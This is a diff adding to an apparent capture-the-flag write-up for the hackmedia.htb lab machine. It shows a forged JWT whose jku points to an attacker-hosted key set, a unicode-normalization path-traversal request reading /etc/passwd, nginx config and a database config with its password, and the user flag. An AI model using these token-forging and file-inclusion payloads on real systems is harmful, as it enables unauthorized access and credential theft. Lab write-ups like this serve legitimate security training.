@@ -166,15 +166,98 @@ print(serialized)
 b'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.izcfGUdFu6U8qPV2-yfRHSCQ0plQOrYk9rMZi7Awn9ow8WCzr5UsSPh18wKPaRzkH3eGQRcih6JSl4fwTUuPUjrh_bISSj6QIQJdCTe01K220nTT1_P8xFMu39dFpwFkdhOwAqRorcLpKjFryMkcXkiQNrwpYPA-eMn6b1DFRwbA3baOGyC8a2pGYUetCgFts_K7h8I_lywBCqS0vMQAeOCw53iskkMUANuJE48wS6gfOXvRane3irAjEqx4NI2QiMzUrFzkJLGFPkP79RyzqlXs1JxyVgjcvprMfapDLip_KEOULDXvsBMJfdBe5yyXOSnnzGQmc3MWxSh4RBBz2Q'
 ````
 
-
 ````
 10.10.11.126 - - [25/Mar/2022 06:23:02] "GET /jwks.json HTTP/1.1" 200 -
+````
+
+## Unicode normalization vulnerability
+
+The `page` parameter has a `path traversal + local file inclusion + unicode normalization` vulnerability.
+
+UTF-8: 0xEF 0xB8 0xB0
+````http
+`GET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd HTTP/1.1
+Host: hackmedia.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.izcfGUdFu6U8qPV2-yfRHSCQ0plQOrYk9rMZi7Awn9ow8WCzr5UsSPh18wKPaRzkH3eGQRcih6JSl4fwTUuPUjrh_bISSj6QIQJdCTe01K220nTT1_P8xFMu39dFpwFkdhOwAqRorcLpKjFryMkcXkiQNrwpYPA-eMn6b1DFRwbA3baOGyC8a2pGYUetCgFts_K7h8I_lywBCqS0vMQAeOCw53iskkMUANuJE48wS6gfOXvRane3irAjEqx4NI2QiMzUrFzkJLGFPkP79RyzqlXs1JxyVgjcvprMfapDLip_KEOULDXvsBMJfdBe5yyXOSnnzGQmc3MWxSh4RBBz2Q
+Upgrade-Insecure-Requests: 1
+
+
+````
+
+````
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 25 Mar 2022 10:52:02 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 1876
+
+root:x:0:0:root:/root:/bin/bash
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+code:x:1000:1000:,,,:/home/code:/bin/bash
+````
+
+## Enumeration
+📃http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default
+````
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 25 Mar 2022 11:03:31 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 432
+
+limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;
+
+server{
+#Change the Webroot from /home/code/app/ to /var/www/html/
+#change the user password from db.yaml
+	listen 80;
+	error_page 503 /rate-limited/;
+	location / {
+                limit_req zone=mylimit;
+		proxy_pass http://localhost:8000;
+		include /etc/nginx/proxy_params;
+		proxy_redirect off;
+	}
+	location /static/{
+		alias /home/code/coder/static/styles/;
+	}
+}
+````
+
+📃http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml
+````
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 25 Mar 2022 11:04:09 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 95
+
+mysql_host: "localhost"
+mysql_user: "code"
+mysql_password: "B3stC0d3r2021@@!"
+mysql_db: "user"
+````
+
+SSH into machine and...
+````
+code@code:~$ cat user.txt 
+5ecb2ce89e7a1d0f01010095b0e6c99e
 ````
 
 # Root
 
 # Secrets
 
+* FLAG_USER = 5ecb2ce89e7a1d0f01010095b0e6c99e
+* 
 
 https://docs.authlib.org/en/latest/jose/index.html
-
+https://www.compart.com/en/unicode/U+FE30
